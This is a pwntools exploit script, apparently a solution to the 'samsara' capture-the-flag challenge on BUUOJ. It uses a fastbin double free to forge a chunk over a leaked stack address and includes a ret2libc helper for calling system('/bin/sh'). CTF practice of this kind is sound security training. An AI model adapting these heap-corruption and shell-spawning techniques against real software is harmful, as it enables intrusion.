from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './samsara'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27090) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def dbg():
	gdb.attach(p)
	pause()

# start
def add():
	sla('> ','1')

def delete(index):
	sla('> ','2')
	sla(':\n',str(index))

def edit(index,content):
	sla('> ','3')
	sla(':\n',str(index))
	sla(':\n',content)

def show():
	sla('> ','4')
	ru('0x')
	return int(ru('\n'),16)

def move(dest):
	sla('> ','5')
	sla('?\n', str(dest))

add() # 0
add() # 1
add() # 2
delete(0)
delete(1)
delete(0)

add() # 3 <-> 0
add() # 4 <-> 1
move(0x20)
fake = show()-8
edit(3,fake)
add() # 5
add() # 6
edit(6,0xdeadbeef)
sla('> ','6')
# end

itr()